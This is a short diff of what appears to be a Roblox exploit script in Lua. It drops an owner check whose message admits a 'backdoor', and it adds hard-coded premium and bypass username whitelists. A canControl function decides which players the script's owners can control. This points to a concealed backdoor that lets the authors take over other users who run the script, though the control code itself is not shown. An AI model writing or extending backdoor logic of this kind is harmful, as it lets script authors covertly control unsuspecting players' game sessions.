@@ -16,16 +16,25 @@ getgenv().ownerUsernames = {
     ["anhchongyeuvo"] = true,
     ["anhchangm53"] = true,
 }
-local function isOwner(plr) return getgenv().ownerUsernames[plr.Name] ~= nil end
-local function hasPremium(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, PREMIUM_PASS_ID) end
-local function hasBypass(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, BYPASS_PASS_ID) end
+getgenv().premiumUsers = {
+    ["XxCookieBaconPlayzxX"] = true,
+    ["zazzvasuy"] = true,
+}
 
-local localPlayer = Players.LocalPlayer
-if isOwner(localPlayer) then
-    print("Owner detected - backdoor tắt")
-    return
+local function isManualPremium(plr)
+    return getgenv().premiumUsers[plr.Name] ~= nil
 end
 
+-- chỉnh lại điều kiện người dùng premium
+
+getgenv().bypassUsers = {
+    ["XxCookieBaconPlayzxX"] = true,
+    ["zazzvasuy"] = true,
+}
+
+local function isOwner(plr) return getgenv().ownerUsernames[plr.Name] ~= nil end
+local function hasPremium(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, PREMIUM_PASS_ID) or isManualPremium(plr) end
+local function hasBypass(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, BYPASS_PASS_ID) or getgenv().bypassUsers[plr.Name] end
 local function canControl(target)
     if isOwner(target) then return false end
     if hasBypass(target) then return false end
